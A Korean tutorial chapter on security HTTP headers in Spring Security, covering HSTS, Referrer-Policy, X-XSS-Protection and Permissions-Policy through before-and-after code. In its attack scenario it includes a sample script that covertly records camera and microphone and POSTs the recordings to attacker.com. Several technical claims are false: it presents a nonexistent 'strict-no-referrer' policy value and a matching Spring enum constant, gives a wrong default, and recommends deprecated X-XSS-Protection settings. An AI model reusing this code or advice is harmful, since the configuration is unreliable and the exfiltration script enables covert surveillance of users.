# 보안 HTTP 헤더 완전 가이드

---

## 🎯 핵심 질문

- HSTS(Strict-Transport-Security)가 SSL Strip 공격을 막는 원리는?
- `includeSubDomains` 옵션이 없으면 어떤 공격이 가능한가?
- `Referrer-Policy: strict-no-referrer`를 사용하면 어떤 정보가 보호되는가?
- `Permissions-Policy`로 카메라/마이크 접근을 막을 수 있는가?

---

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

### SSL Strip 공격으로 Gmail 계정 탈취 (2011)
공격자가 공개 WiFi 핫스팟에서 Man-in-the-Middle 공격으로 HTTPS를 HTTP로 강등시켰습니다. 사용자가 gmail.com을 입력하면 http://gmail.com으로 리다이렉트되었고, 로그인 페이지가 HTTP로 전송되어 계정 정보가 탈취되었습니다. HSTS가 없었기 때문에 가능한 공격이었습니다.

### Facebook Referer 정보 유출 (2013)
사용자가 Facebook을 거쳐 외부 사이트로 이동할 때, Referer 헤더에 사용자의 고유 ID가 포함되었습니다. 외부 사이트가 이를 수집해서 사용자의 Facebook 활동을 추적했습니다.

### YouTube의 카메라 권한 악용 (2018)
일부 브라우저 확장 프로그램이 사용자에게 명확한 동의 없이 카메라 권한을 요청했습니다. 사용자가 무심코 "허용"을 클릭하면 웹사이트에서 카메라에 접근할 수 있게 되었습니다.

---

## 😱 취약한 코드 (Before — 원리를 모를 때의 구현)

### 1. HSTS 헤더 없음

**취약한 Spring Configuration**
```java
@Configuration
public class WebConfig {
    
    // ❌ 문제: HSTS 헤더 설정 안 함
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                // HSTS 헤더 없음!
                .frameOptions(frameOptions -> frameOptions.deny())
                .contentTypeOptions()
            );
        
        return http.build();
    }
}
```

**공격 시나리오**
```
1단계: 사용자가 공개 WiFi 연결
┌─────────────────────────────────────┐
│ 공공 카페의 무료 WiFi 접속
│ (공격자가 운영하는 악의적인 핫스팟)
└─────────────────────────────────────┘

2단계: 사용자가 은행 사이트 방문
┌─────────────────────────────────────┐
│ 주소창에 "bank.com" 입력
│ (https 프로토콜을 명시하지 않음)
└─────────────────────────────────────┘

3단계: 공격자의 중간자 공격 (MITM)
┌─────────────────────────────────────┐
│ HTTP 요청 가로채기: GET / HTTP/1.1
│ 공격자의 서버로 리다이렉트:
│ HTTP/1.1 301 Moved Permanently
│ Location: http://bank.com (여전히 HTTP!)
│
│ HSTS 헤더가 없으므로:
│ → 브라우저가 자동으로 HTTPS로 업그레이드 안 함
│ → HTTP로 진행됨 ❌
└─────────────────────────────────────┘

4단계: 로그인 정보 탈취
┌─────────────────────────────────────┐
│ 사용자가 http://bank.com에서 로그인
│ (공격자가 호스팅하는 페이지)
│
│ POST /login HTTP/1.1
│ username=user&password=secret
│
│ 모든 정보가 평문으로 전송됨 ❌
│ 공격자가 완전히 가로챔
└─────────────────────────────────────┘

5단계: 계정 해킹
┌─────────────────────────────────────┐
│ 공격자가 탈취한 정보로 은행 계정 접근
│ 자금 이체 가능
└─────────────────────────────────────┘
```

---

### 2. Referrer-Policy 설정 없음 (기본값)

**취약한 상태**
```java
@Configuration
public class WebConfig {
    // ❌ 문제: Referrer-Policy 설정 안 함
    // 브라우저 기본값: "no-referrer-when-downgrade"
    // (HTTPS → HTTP일 때만 referer 제거, 그 외엔 모두 전송)
}
```

**공격 시나리오**
```
사용자 흐름:
1. 페이스북에 로그인
2. 페이스북에서 https://sensitive-site.com/user/profile?id=12345 방문
3. 해당 사이트의 외부 링크(광고) 클릭
4. 광고 네트워크 사이트로 이동

HTTP Referer 헤더:
GET /click HTTP/1.1
Referer: https://sensitive-site.com/user/profile?id=12345
Host: ad-network.com

광고 네트워크가 수집:
- 어떤 사용자가 sensitive-site에 방문했는가
- 사용자의 프로필 ID 추출
- 다른 광고주와 공유
- 타사 데이터 브로커에 판매

결과:
- 사용자의 활동 추적
- 개인정보 유출
- 행동 기반 광고 타겟팅
```

---

### 3. X-XSS-Protection 헤더 없음 (구형 브라우저)

**취약한 상태**
```
X-XSS-Protection 헤더 없음

IE 10 이하, Edge (구형):
- 반사 XSS 공격 감지 안 함
- 공격자의 스크립트 실행 (차단 안 됨)

모던 브라우저:
- CSP와 기타 방어로 커버됨
```

---

### 4. Permissions-Policy 없음 (구형: Feature-Policy)

**취약한 상태**
```java
// ❌ 문제: Permissions-Policy 헤더 설정 안 함

// 브라우저 기본값:
// 모든 웹사이트가 모든 기능(카메라, 마이크 등) 요청 가능
```

**공격 시나리오**
```
악성 웹사이트:
```html
<script>
// 사용자에게 permission 요청
navigator.mediaDevices.getUserMedia({ audio: true, video: true })
    .then(stream => {
        // 카메라/마이크 접근 성공
        // 몰래 녹화 시작
        const recorder = new MediaRecorder(stream);
        recorder.start();
        
        // 녹화 데이터를 공격자 서버로 전송
        recorder.ondataavailable = event => {
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: event.data
            });
        };
    })
    .catch(err => console.log('permission denied'));
</script>
```

사용자는:
1. 웹사이트를 방문하면 "카메라 접근 허용?" 팝업
2. 무심코 "허용" 클릭
3. 카메라가 활성화되고 상대방 모르게 녹화됨
```

---

## ✨ 방어 코드 (After — 공격 원리를 알고 설계한 구현)

### 1. HSTS (Strict-Transport-Security)

**Spring Security Configuration**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // ✅ 방어 1: HTTPS 강제
            .requiresChannel(channel -> channel
                .anyRequest()
                .requiresSecure()
            )
            
            // ✅ 방어 2: HSTS 헤더 설정
            .headers(headers -> headers
                .httpStrictTransportSecurity(hsts -> hsts
                    // max-age: 1년 동안 모든 요청을 HTTPS로 강제
                    .maxAgeInSeconds(31536000)
                    
                    // includeSubDomains: 서브도메인도 HSTS 적용
                    .includeSubDomains(true)
                    
                    // preload: Google Preload List에 등록 (모든 브라우저가 알고 있음)
                    .preload(true)
                )
            );
        
        return http.build();
    }
}

// 응답 헤더:
// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**HSTS 작동 원리**
```
1단계: 첫 방문 (HTTPS)
┌─────────────────────────────────────┐
│ GET / HTTPS
│ ← Strict-Transport-Security: max-age=31536000
│
│ 브라우저가 헤더를 읽고:
│ "앞으로 1년 동안 이 도메인은 무조건 HTTPS"라고 기억
└─────────────────────────────────────┘

2단계: 차후 방문 (HTTP 시도)
┌─────────────────────────────────────┐
│ 사용자가 주소창에 "example.com" 입력
│ (프로토콜 명시 안 함)
│
│ 일반적이면:
│ 1. 브라우저가 HTTP로 요청
│ 2. 서버가 HTTPS로 리다이렉트
│ 3. 첫 요청이 평문으로 전송됨 (취약)
│
│ HSTS 설정되면:
│ 1. 브라우저가 로컬 HSTS 캐시 확인
│ 2. "example.com은 HTTPS만 허용" 확인
│ 3. 브라우저가 자동으로 HTTPS로 변경
│ 4. HTTPS 요청만 전송 ✅
│
│ 공격자의 HTTP 리다이렉트 공격 실패!
└─────────────────────────────────────┘

3단계: 서브도메인 보호
┌─────────────────────────────────────┐
│ includeSubDomains가 있으면:
│ api.example.com
│ mail.example.com
│ shop.example.com
│
│ 모두 HSTS 적용 받음
│
│ 공격자가 api.example.com을 HTTP로 호스팅해도:
│ → 브라우저가 자동으로 HTTPS로 업그레이드
└─────────────────────────────────────┘

4단계: Preload List
┌─────────────────────────────────────┐
│ preload 옵션이 있으면:
│
│ 사이트가 HSTS Preload List에 등록됨
│ (Google이 관리하는 공개 목록)
│
│ 모든 모던 브라우저가 내장:
│ Chrome, Firefox, Safari, Edge 등
│
│ 처음 방문하는 사용자도 첫 요청부터 HSTS 적용 ✅
│
│ 장점:
│ - 첫 방문부터 보호
│ - 로컬 캐시 의존하지 않음
│
│ 주의:
│ - 등록 후 취소하기 어려움
│ - 도메인 포기할 때 최소 6개월 HSTS 유지 필요
└─────────────────────────────────────┘
```

---

### 2. Referrer-Policy

**Spring Security Configuration**
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .referrerPolicy(referrer -> referrer
                    // ✅ 가장 엄격: Referer 헤더 완전 제거
                    .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_NO_REFERRER)
                    
                    // 또는 선택사항들:
                    // .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.NO_REFERRER)
                    // .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.SAME_ORIGIN)
                    // .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_NO_REFERRER_WHEN_DOWNGRADE)
                )
            );
        
        return http.build();
    }
}

// 응답 헤더:
// Referrer-Policy: strict-no-referrer
```

**Referrer-Policy 옵션별 비교**
```
┌─────────────────────────────────────────────────────────────┐
│ Policy: no-referrer (가장 엄격)                             │
│ Referer 전송: 절대 안 함                                     │
│ 예시:                                                       │
│   HTTPS → HTTP: Referer 제거                                │
│   HTTPS → HTTPS: Referer 제거                               │
│   HTTP → HTTP: Referer 제거                                 │
│ 사용처: 매우 민감한 정보 다루는 사이트                       │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ Policy: strict-no-referrer (권장)                           │
│ = no-referrer와 동일 (더 강한 의미)                         │
│ 주의: "no-referrer"가 표준 이름                             │
│      "strict-no-referrer"는 alias                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ Policy: same-origin (균형)                                  │
│ Referer 전송: 같은 사이트로만 전송                           │
│ 예시:                                                       │
│   example.com → example.com: Referer 전송 ✅                │
│   example.com → other.com: Referer 제거                     │
│   example.com → ads.com: Referer 제거                       │
│ 사용처: 외부 광고/추적 차단하면서 내부 분석 유지             │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ Policy: strict-no-referrer-when-downgrade (기본값)          │
│ Referer 전송: HTTPS → HTTP 다운그레이드 시에만 제거           │
│ 예시:                                                       │
│   HTTPS → HTTPS: Referer 전송 ✅                            │
│   HTTPS → HTTP: Referer 제거 ✅                             │
│   HTTP → HTTPS: Referer 전송                                │
│   HTTP → HTTP: Referer 전송                                 │
│ 주의: HTTP 사이트에서는 여전히 정보 유출                     │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ Policy: no-referrer-when-downgrade (deprecated)             │
│ 오래된 이름, strict-no-referrer-when-downgrade와 유사        │
└─────────────────────────────────────────────────────────────┘
```

**코드 예시**
```java
// 고급: 정책별 필터
@Component
public class ReferrerPolicyFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                   HttpServletResponse response,
                                   FilterChain filterChain) 
            throws ServletException, IOException {
        // ✅ 민감한 페이지: 완전 제거
        if (request.getRequestURI().contains("/account/") ||
            request.getRequestURI().contains("/transfer")) {
            response.setHeader("Referrer-Policy", "no-referrer");
        }
        // ✅ 일반 페이지: 같은 사이트로만
        else {
            response.setHeader("Referrer-Policy", "same-origin");
        }
        
        filterChain.doFilter(request, response);
    }
}
```

---

### 3. X-XSS-Protection (구형 브라우저 호환성)

**Spring Security Configuration**
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                // ✅ 구형 브라우저(IE 10 이하)를 위한 XSS 방어
                .xssProtection(xss -> xss
                    // mode=block: XSS 탐지 시 페이지 차단
                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ON_WITH_MODE_BLOCK)
                )
            );
        
        return http.build();
    }
}

// 응답 헤더:
// X-XSS-Protection: 1; mode=block
```

**X-XSS-Protection 옵션**
```
X-XSS-Protection: 0
→ XSS 필터 비활성화 (권장하지 않음)

X-XSS-Protection: 1
→ XSS 탐지하지만 페이지는 로드 (유지만 하고 차단 안 함)

X-XSS-Protection: 1; mode=block (권장)
→ XSS 탐지 시 페이지 차단 (더 안전)

X-XSS-Protection: 1; report=<reporting-uri>
→ XSS 탐지 시 특정 URL로 리포트 전송
```

---

### 4. Permissions-Policy (구형: Feature-Policy)

**Spring Configuration**
```java
@Configuration
public class SecurityConfig {
    
    @Component
    public class PermissionsPolicyFilter extends OncePerRequestFilter {
        
        @Override
        protected void doFilterInternal(HttpServletRequest request,
                                       HttpServletResponse response,
                                       FilterChain filterChain) 
                throws ServletException, IOException {
            // ✅ 방어: 모든 민감한 기능 차단
            response.setHeader("Permissions-Policy",
                "camera=(), " +              // 카메라 완전 차단
                "microphone=(), " +          // 마이크 완전 차단
                "geolocation=(), " +         // 위치 정보 차단
                "usb=(), " +                 // USB 접근 차단
                "payment=(), " +             // Payment API 차단
                "accelerometer=(), " +       // 가속도계 차단
                "gyroscope=(), " +           // 자이로스코프 차단
                "magnetometer=(), " +        // 자기계 차단
                "clipboard-read=(), " +      // 클립보드 읽기 차단
                "clipboard-write=(), " +     // 클립보드 쓰기 차단
                "fullscreen=(self), " +      // 자신의 페이지에서만 허용
                "picture-in-picture=(self)"  // PiP는 자신의 페이지에서만
            );
            
            filterChain.doFilter(request, response);
        }
    }
}

// 응답 헤더 예시:
// Permissions-Policy: camera=(), microphone=(), geolocation=()
```

**세부 설정 (필요한 기능만 허용)**
```java
// 예: 화상 회의 웹사이트
response.setHeader("Permissions-Policy",
    // 자신의 도메인에서만 허용
    "camera=(self), " +
    "microphone=(self), " +
    
    // 특정 신뢰 가능한 파트너만 허용
    "camera=(self \"https://trusted-cdn.com\"), " +
    
    // 모든 iframe 허용 (주의: 위험)
    "camera=*, " +
    
    // 모든 기능 차단
    "geolocation=()"
);
```

---

### 5. 모든 보안 헤더 통합 설정

**완벽한 Spring Security Configuration**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // ✅ HTTPS 강제
            .requiresChannel(channel -> channel
                .anyRequest()
                .requiresSecure()
            )
            
            // ✅ 모든 보안 헤더 설정
            .headers(headers -> headers
                
                // 1. HSTS (HTTPS 강제)
                .httpStrictTransportSecurity(hsts -> hsts
                    .maxAgeInSeconds(31536000)
                    .includeSubDomains(true)
                    .preload(true)
                )
                
                // 2. X-Content-Type-Options (MIME 타입 스니핑 방지)
                .contentTypeOptions()
                
                // 3. X-Frame-Options (Clickjacking 방지)
                .frameOptions(frameOptions -> frameOptions.deny())
                
                // 4. Content Security Policy (XSS 방지)
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' 'nonce-{nonce}'; " +
                        "style-src 'self'; " +
                        "img-src 'self' data: https:; " +
                        "font-src 'self'; " +
                        "connect-src 'self'; " +
                        "frame-ancestors 'none'; " +
                        "base-uri 'self'; " +
                        "form-action 'self'; " +
                        "report-uri /api/csp-report"
                    )
                )
                
                // 5. X-XSS-Protection (구형 브라우저)
                .xssProtection(xss -> xss
                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ON_WITH_MODE_BLOCK)
                )
                
                // 6. Referrer-Policy (개인정보 보호)
                .referrerPolicy(referrer -> referrer
                    .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_NO_REFERRER)
                )
            );
        
        // ✅ Permissions-Policy (별도 필터)
        http.addFilterBefore(new PermissionsPolicyFilter(), 
                            HeaderWriterFilter.class);
        
        // ✅ CSRF 보호
        http.csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        );
        
        // ✅ CORS 설정 (필요한 경우)
        http.cors(cors -> cors.configurationSource(corsConfigurationSource()));
        
        return http.build();
    }
    
    private CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://trusted-domain.com"));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        config.setAllowedHeaders(List.of("*"));
        config.setAllowCredentials(true);
        config.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }
    
    // ✅ Permissions-Policy 필터
    @Component
    public static class PermissionsPolicyFilter extends OncePerRequestFilter {
        @Override
        protected void doFilterInternal(HttpServletRequest request,
                                       HttpServletResponse response,
                                       FilterChain filterChain) 
                throws ServletException, IOException {
            response.setHeader("Permissions-Policy",
                "camera=(), microphone=(), geolocation=(), " +
                "usb=(), payment=(), accelerometer=(), " +
                "gyroscope=(), magnetometer=(), " +
                "clipboard-read=(), clipboard-write=(), " +
                "fullscreen=(self), picture-in-picture=(self)"
            );
            filterChain.doFilter(request, response);
        }
    }
    
    // ✅ CSP Nonce 필터 (매요청마다 새로운 nonce 생성)
    @Component
    public static class CspNonceFilter extends OncePerRequestFilter {
        @Override
        protected void doFilterInternal(HttpServletRequest request,
                                       HttpServletResponse response,
                                       FilterChain filterChain) 
                throws ServletException, IOException {
            String nonce = UUID.randomUUID().toString();
            request.setAttribute("cspNonce", nonce);
            
            // CSP 헤더에 nonce 포함
            String originalCsp = response.getHeader("Content-Security-Policy");
            if (originalCsp != null) {
                String newCsp = originalCsp.replace("{nonce}", nonce);
                response.setHeader("Content-Security-Policy", newCsp);
            }
            
            filterChain.doFilter(request, response);
        }
    }
}
```

---

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### HSTS 헤더 없음에서의 공격

```
공격 플로우:

1단계: 공격자가 공개 WiFi 핫스팟 운영
┌─────────────────────────────────────┐
│ "Free WiFi" SSID
│ (공격자가 제어하는 라우터)
└─────────────────────────────────────┘

2단계: 사용자가 연결하고 은행 접속 시도
┌─────────────────────────────────────┐
│ 사용자 브라우저: GET bank.com (HTTPS 명시 안 함)
│ 기본 프로토콜: HTTP
│
│ 사용자가 보내는 요청:
│ GET / HTTP/1.1
│ Host: bank.com
└─────────────────────────────────────┘

3단계: 공격자의 DNS 스푸핑/중간자 공격
┌─────────────────────────────────────┐
│ 사용자의 요청을 가로챔 (WiFi 제어)
│ 
│ 공격자가 보내는 응답:
│ HTTP/1.1 301 Moved Permanently
│ Location: http://bank.com (여전히 HTTP!)
│ 
│ HSTS가 없으면:
│ → 브라우저가 자동으로 HTTPS로 업그레이드 안 함
│ → HTTP로 진행함
└─────────────────────────────────────┘

4단계: 로그인 페이지 노출
┌─────────────────────────────────────┐
│ 사용자: http://bank.com에서 로그인 페이지 표시
│ (실제로는 공격자의 피싱 페이지)
│
│ 모든 통신이 HTTP (암호화 안 됨)
│ 공격자가 완전히 가로챔
└─────────────────────────────────────┘

5단계: 계정 탈취
┌─────────────────────────────────────┐
│ 사용자가 입력한 로그인 정보:
│ POST /login HTTP/1.1
│ username=john&password=secret123
│
│ 공격자가 모두 수집!
└─────────────────────────────────────┘
```

---

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실험 1: HSTS 테스트

**Step 1: 응답 헤더 확인**
```bash
# HSTS 헤더 없는 경우
curl -i http://vulnerable.example.com/

# 응답:
# HTTP/1.1 200 OK
# (Strict-Transport-Security 헤더 없음)

# HSTS 헤더 있는 경우
curl -i https://secure.example.com/

# 응답:
# HTTP/1.1 200 OK
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Step 2: 브라우저 HSTS 저장소 확인 (Chrome)**
```
chrome://net-internals/#hsts

HSTS 정책이 저장된 도메인 목록 확인 가능
```

**Step 3: SSL Strip 공격 시뮬레이션**
```bash
# 공격자의 프록시 도구 (mitmproxy)
mitmproxy -p 8080

# 피해자의 브라우저:
# 프록시 설정: localhost:8080

# 피해자가 은행 사이트 접속 시도:
# https://bank.com → http://bank.com (강등)

# HSTS가 없으면:
# → 경고 없이 HTTP로 접속됨 (취약!)

# HSTS가 있으면:
# → 브라우저가 자동으로 HTTPS 사용
# → SSL Strip 공격 실패
```

---

### 실험 2: Referrer-Policy 확인

**Step 1: 링크 클릭 시 Referer 헤더 확인**
```bash
# 로그 모니터링 (터미널에서)
nc -l 8888

# HTML에서 링크 클릭:
# <a href="http://localhost:8888/">Click me</a>

# Referer-Policy: no-referrer
# → Referer 헤더 전송 안 됨 ✅
# GET / HTTP/1.1
# (Referer 헤더 없음)

# Referer-Policy: same-origin
# → 다른 도메인이므로 Referer 전송 안 됨
# GET / HTTP/1.1
# (Referer 헤더 없음)
```

---

## 📊 보안 헤더 체크리스트

| 헤더 | 용도 | 권장 값 |
|------|------|--------|
| Strict-Transport-Security | HTTPS 강제 | max-age=31536000; includeSubDomains; preload |
| X-Content-Type-Options | MIME 스니핑 방지 | nosniff |
| X-Frame-Options | Clickjacking 방지 | DENY |
| Content-Security-Policy | XSS 방지 | script-src 'self' 'nonce-{nonce}'; ... |
| X-XSS-Protection | 구형 브라우저 XSS 방지 | 1; mode=block |
| Referrer-Policy | 개인정보 보호 | no-referrer 또는 same-origin |
| Permissions-Policy | 기능 접근 제한 | camera=(), microphone=(), ... |

---

## 📌 핵심 정리

### 공격별 필수 헤더

```
XSS 공격:
- Content-Security-Policy
- X-XSS-Protection
- X-Content-Type-Options

Clickjacking:
- X-Frame-Options
- Content-Security-Policy (frame-ancestors)

HTTPS 다운그레이드:
- Strict-Transport-Security
- (HTTP → HTTPS 리다이렉트는 보조)

개인정보 유출:
- Referrer-Policy

악성 기능 접근:
- Permissions-Policy
```

---

## 🤔 생각해볼 문제 (+ 해설)

### Q1. HSTS Preload List에 등록되면 취소할 수 없는가?

**해설**
```
등록 절차:
1. https://hstspreload.org에 도메인 제출
2. 심사 후 승인
3. 모든 주요 브라우저의 소스 코드에 포함
4. 다음 브라우저 버전 배포 (수주)

취소 절차:
1. 도메인에서 HSTS 헤더 제거
2. https://hstspreload.org에서 제거 신청
3. 브라우저가 다음 버전에서 제거 (수주)

실제 문제:
- 취소 신청 후 최소 6개월 HSTS 유지 필요
  (기존 사용자의 브라우저가 아직 캐시를 갖고 있을 수 있음)

- 도메인을 완전히 포기하려면?
  → HSTS Preload에서 영원히 제거
  → 매우 복잡한 절차

따라서:
- HSTS 등록은 신중하게 결정할 것
- 도메인을 장기간 유지할 수 있을 때만 등록
- 테스트: Report-Only 모드나 낮은 max-age에서 시작
```

---

### Q2. Referrer-Policy를 no-referrer로 설정하면 analytics 데이터를 잃지 않는가?

**해설**
```
no-referrer의 영향:

분실되는 정보:
- 외부 사이트에서 유입된 경로 추적 불가
- 검색 엔진 검색어 알 수 없음
- 관련 사이트에서의 트래픽 추적 불가

예시:
```
사용자: Google에서 "best pizza" 검색
→ www.mysite.com/pizza 클릭

일반적인 Referer:
GET /pizza HTTP/1.1
Referer: https://www.google.com/search?q=best+pizza

no-referrer:
GET /pizza HTTP/1.1
(Referer 헤더 없음)

분석 결과:
- Google에서 유입된 트래픽임을 모름
- "best pizza" 검색어를 모름
```

절충 방안:

1. 정책 분리:
```
Referrer-Policy: same-origin

내부 링크 분석:
- 같은 도메인 간의 흐름 추적 가능
- 사용자가 어디서 왔는지 알 수 있음

외부 링크:
- Referer 제거
- 외부 트래킹 방지
```

2. 1st Party Data Collection:
```javascript
// Google Analytics 같은 1st party 스크립트 사용
// Referer 의존하지 않음
gtag('config', 'GA_ID');

// 또는 URL 파라미터 사용:
// /pizza?utm_source=google&utm_campaign=search
```

3. Server-side Tracking:
```
Referer가 없어도:
- 고객이 로그인했으면 사용자 ID로 추적
- 쿠키 기반 추적
- 자체 분석 시스템 구축
```

권장:
- 개인정보 보호와 분석의 균형 필요
- no-referrer는 매우 엄격한 정책
- same-origin이 더 현실적
```

---

### Q3. Permissions-Policy를 너무 엄격하게 설정하면 정상 기능도 못 쓰는가?

**해설**
```
예시: 화상 회의 웹사이트

너무 엄격한 설정:
```
Permissions-Policy: camera=(), microphone=()
```

결과:
- 화상 회의 기능 완전 작동 안 함
- 사용자가 자신의 페이지에서도 카메라 접근 불가능

올바른 설정:
```
Permissions-Policy: camera=(self), microphone=(self)
```

또는 파트너 도메인 포함:
```
Permissions-Policy: 
  camera=(self "https://cdn.example.com"),
  microphone=(self "https://cdn.example.com")
```

선택적 설정 (권장):
```java
// 페이지별로 다른 정책 적용
@Component
public static class PermissionsPolicyFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                   HttpServletResponse response,
                                   FilterChain filterChain) 
            throws ServletException, IOException {
        
        String policy;
        
        // 화상 회의 페이지
        if (request.getRequestURI().contains("/conference")) {
            policy = "camera=(self), microphone=(self)";
        }
        // 결제 페이지
        else if (request.getRequestURI().contains("/checkout")) {
            policy = "payment=(self)";
        }
        // 일반 페이지
        else {
            policy = "camera=(), microphone=(), geolocation=()";
        }
        
        response.setHeader("Permissions-Policy", policy);
        filterChain.doFilter(request, response);
    }
}
```

핵심:
- 필요한 기능만 명시적으로 허용
- 불필요한 기능은 모두 차단
- iframe에서는 더 엄격하게 (default: ())
```

<div align="center">

**[⬅️ 이전: Clickjacking](./04-clickjacking.md)** | **[홈으로 🏠](../README.md)** | **[다음: Open Redirect ➡️](./06-open-redirect.md)**

</div>
